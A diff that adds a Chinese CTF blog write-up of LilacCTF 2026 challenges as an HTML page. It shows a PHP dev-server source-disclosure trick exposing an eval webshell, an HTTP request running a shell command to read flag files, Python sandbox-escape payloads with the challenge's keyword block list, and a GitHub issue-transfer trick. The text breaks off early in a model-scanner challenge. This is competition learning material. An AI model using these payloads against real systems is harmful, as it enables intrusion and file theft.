@@ -1,0 +1,561 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>LilacCTF 2026 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#keep"><span class="toc-number">2.</span> <span class="toc-text">keep</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Your-GitHub-mine"><span class="toc-number">3.</span> <span class="toc-text">Your GitHub, mine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CheckIn%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">CheckIn（复现）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nailong%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">Nailong（Unsolved）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Path"><span class="toc-number">6.</span> <span class="toc-text">Path</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#safe-sql%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">safe-sql（Unsolved）</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>LilacCTF 2026</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/1/24
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.2k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/">https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/</a></p>
+<p><a target="_blank" rel="noopener" href="https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1">https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="keep"><a href="#keep" class="headerlink" title="keep"></a>keep</h1><p>404报错页面一眼 <code>php -S</code> 起的服务器</p>
+<p>php 7.3.4，直接打源码泄露</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">61.147.171.103:60623</span></span>
+
+
+<span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/1.txt</span> <span class="token http-version property">HTTP/1.1</span></span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>返回</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello World!"</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
+
+<span class="token comment">// s3Cr37_f1L3.php.bak</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问 s3Cr37_f1L3.php.bak 返回</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>但是尝试访问 s3Cr37_f1L3.php 发现不存在这个文件，猜测是要把 bak 解析为 php</p>
+<p>根据自己的早期<a href="/blog/2023/05/22/PHP-7-4-21%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">文章</a>记载，第二个GET后的 <code>/</code> 请求的如果是 .php 或 .PHP 后缀则会视为 php 文件解析</p>
+<p>至于如何传 POST 参数，测试发现只要带上 CL 头算清楚请求体长度即可</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/s3Cr37_f1L3.php.bak</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">61.147.171.103:60623</span></span>
+
+
+<span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/1.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">24</span></span>
+
+admin=system('cat+/f*');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到 flag</p>
+<hr>
+<h1 id="Your-GitHub-mine"><a href="#Your-GitHub-mine" class="headerlink" title="Your GitHub, mine"></a>Your GitHub, mine</h1><p>先访问 classroom 链接加入 classroom 仓库</p>
+<p>然后 nc bot，选择 create issue</p>
+<p>接下来进入那个 issue，编辑 issue 正文，修改为 <code>@lilacctf-tech</code></p>
+<p>改变 owner 到自己，修改为 public，transfer issue 到自己的公开仓库</p>
+<p>然后 check issue</p>
+<p><img src="/blog/2026/01/24/LilacCTF-2026/IMG-20260124131214345.png"></p>
+<hr>
+<h1 id="CheckIn（复现）"><a href="#CheckIn（复现）" class="headerlink" title="CheckIn（复现）"></a>CheckIn（复现）</h1><p>没绷住能扫出 back.zip，那我黑盒全测完了算什么（</p>
+<p>backup.zip</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Python 3.14.2</span>
+<span class="token keyword">import</span> re
+<span class="token keyword">from</span> collections <span class="token keyword">import</span> UserList
+<span class="token keyword">from</span> sys <span class="token keyword">import</span> argv
+
+<span class="token keyword">class</span> <span class="token class-name">LockedList</span><span class="token punctuation">(</span>UserList<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Assignment blocked!"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR: Missing code"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        status <span class="token operator">=</span> LockedList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        status_id <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span>
+        user_input <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[0-9A-Z]'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: No numbers or alphas"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[_\s=+\[\],"\'\&lt;\>\-\*@#$%^&amp;\\\|\&#123;\&#125;\:;]'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Incorrect symbol detected"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals)'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">.</span>casefold<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Keywords detected"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: Input too long! Keep it concise and it is very simple."</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        <span class="token builtin">eval</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span>
+        
+        <span class="token keyword">if</span> status<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token builtin">id</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">==</span> status_id<span class="token punctuation">:</span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SUCCESS! Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"FAILURE: status is still </span><span class="token interpolation"><span class="token punctuation">&#123;</span>status<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Don't be evil~ And I won't show you this error :)"</span></span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    sandbox<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<p>No numbers or alphas：数字和大写字母<br>Incorrect symbol detected：_，+，;，’，”，空格，换行，&lt;&gt;，&amp;，^，<code>-~</code>，<code>-(</code><br>Keywords detected：help，eval，exec，open，system，globals，builtins，os，locals，breakpoint，getattr，import，is，flag，not，status</p>
+<p>限长 60</p>
+<p>fuzz 的可用结果：compile，license，vars，credits，dir，dict，int，float，str，min，get，extend，reverse，join，items，len，in</p>
+<p>可以构造出这样一个 payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">FAILURE<span class="token punctuation">:</span> status <span class="token keyword">is</span> still <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>license<span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+FAILURE<span class="token punctuation">:</span> status <span class="token keyword">is</span> still <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__name'</span><span class="token punctuation">,</span> <span class="token string">'license'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__data'</span><span class="token punctuation">,</span> <span class="token string">'See https://www.python.org/psf/license/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__lines'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'_Printer__filenames'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'/usr/local/lib/python3.14/../LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/../LICENSE'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.14/LICENSE'</span><span class="token punctuation">,</span> <span class="token string">'./LICENSE.txt'</span><span class="token punctuation">,</span> <span class="token string">'./LICENSE'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可知版本是 python 3.14</p>
+<p>获取 status is still 列表的方法：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>把回显的结果拼在 list 后面，测试得知</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">]</span>
+<span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token string">'status_id'</span><span class="token punctuation">,</span> <span class="token string">'user_input'</span><span class="token punctuation">&#125;</span>
+<span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token string">'status'</span>
+<span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span>
+dict_items<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'status_id'</span><span class="token punctuation">,</span>
+<span class="token number">140205775626528</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'user_input'</span><span class="token punctuation">,</span>
+<span class="token string">'vars().get(min(dir())).append(vars().items())'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>把 <code>min(vars())</code> 换成 <code>min(dir())</code> 可以节省一个字符</p>
+<p>猜测目标是让 status 为 True，那么需要真值</p>
+<p>这里就会涉及到一个问题，现在我们没有获取数值 1 的方法，到这里如果没拿到源码的话很难猜到这里的逻辑是 <code>if status[0] and id(status) == status_id</code></p>
+<p>只需要任意非 0 数值即可成功…</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token number">1</span>
+<span class="token number">0</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span>
+<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取 -1 的方法有不少：<code>~(int())</code></p>
+<p>不过我们需要把原先的 False 去掉，也就是要 pop()</p>
+<p>最终 payload：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">~</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2026/01/24/LilacCTF-2026/IMG-20260127111648585.png"></p>
+<hr>
+<h1 id="Nailong（Unsolved）"><a href="#Nailong（Unsolved）" class="headerlink" title="Nailong（Unsolved）"></a>Nailong（Unsolved）</h1><p>Streamlit 框架，使用 Huggingface 的模型扫描器（Picklescan）</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token punctuation">,</span> models
+model <span class="token operator">=</span> models<span class="token punctuation">.</span>resnet50<span class="token punctuation">(</span>weights<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
+num_features <span class="token operator">=</span> model<span class="token punctuation">.</span>fc<span class="token punctuation">.</span>in_features
+model<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>num_features<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
